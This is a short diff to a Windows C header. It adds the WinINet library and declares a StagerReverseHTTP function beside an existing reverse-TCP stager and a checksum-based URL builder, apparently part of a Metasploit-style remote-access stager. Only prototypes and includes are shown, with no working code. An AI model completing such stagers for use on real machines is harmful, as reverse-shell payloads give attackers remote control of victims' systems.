@@ -1,12 +1,13 @@
 #pragma once
 #pragma comment(lib, "Ws2_32.lib") // Better here than linker settings...
-
+#pragma comment(lib, "wininet.lib")
 #include <stdio.h>
 #include <string.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h> // Make *sure* windows.h gets included after everyting else ... redefinition hell...
 #include <time.h>
+#include <Wininet.h>
 
 #include "Constants.h"
 #include "resource.h"
@@ -48,3 +49,4 @@ void BuildURL(char *url, int checksum8);
 
 
 void StagerRevereTCP(wchar_t* IP, wchar_t* iPort);
+void StagerReverseHTTP(wchar_t *IP, wchar_t *iPort, wchar_t *transport);
